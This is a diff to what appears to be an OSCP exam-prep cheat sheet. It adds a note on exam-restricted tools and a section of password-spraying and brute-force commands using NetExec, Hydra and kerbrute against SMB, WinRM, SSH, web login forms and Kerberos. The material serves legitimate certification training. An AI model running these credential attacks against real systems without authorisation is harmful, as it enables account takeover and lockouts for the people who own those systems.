@@ -7,6 +7,29 @@
 3. Wordlists: rockyou → custom (company, seasons, found strings)
 4. Rules for near-misses (`best64`, `rockyou-30000`)
 
+> **Exam note:** Prefer manual / intentional sprays. Auto-exploitation stacks (e.g. **sqlmap**, unrestricted Metasploit modules, auto LinPEAS exploit features) are limited or disallowed — confirm the live exam guide. Community sheets such as [0xsyr0/OSCP](https://github.com/0xsyr0/OSCP) highlight sqlmap-style auto tools as exam-restricted.
+
+## Online / spray (before offline crack)
+
+```bash
+# NetExec spray (prefer over CrackMapExec)
+nxc smb TARGETS -u users.txt -p 'Welcome1' --continue-on-success
+nxc smb TARGETS -u USER -p passwords.txt --continue-on-success
+nxc winrm TARGET -u users.txt -p 'Password123!' --continue-on-success
+nxc ssh TARGET -u users.txt -p passwords.txt
+
+# Hydra (common services)
+hydra -L users.txt -P passwords.txt ssh://TARGET
+hydra -l admin -P passwords.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
+hydra -L users.txt -P passwords.txt smb://TARGET
+
+# Kerberos username enum / spray (domain)
+kerbrute userenum -d DOMAIN.LOCAL --dc DC_IP users.txt
+kerbrute passwordspray -d DOMAIN.LOCAL --dc DC_IP users.txt 'Summer2026!'
+```
+
+Default-cred lists (labs): [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).
+
 ## Identify the hash
 
 ```bash
